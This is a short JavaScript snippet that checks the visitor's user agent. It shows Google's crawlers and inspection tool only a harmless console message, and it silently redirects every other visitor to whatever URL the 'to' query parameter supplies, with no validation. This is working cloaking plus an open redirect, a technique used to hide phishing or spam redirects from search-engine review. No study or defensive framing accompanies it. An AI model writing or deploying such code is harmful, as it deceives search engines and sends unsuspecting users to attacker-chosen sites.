const ua = navigator.userAgent;

if (!ua.includes('Googlebot') && !ua.includes('Google-InspectionTool')) {
  const urlParams = new URLSearchParams(window.location.search);
  const targetUrl = urlParams.get('to');

  if (targetUrl) {
    window.location.href = targetUrl;
  }
} else {
  console.log("Thanks for visiting my page");
}
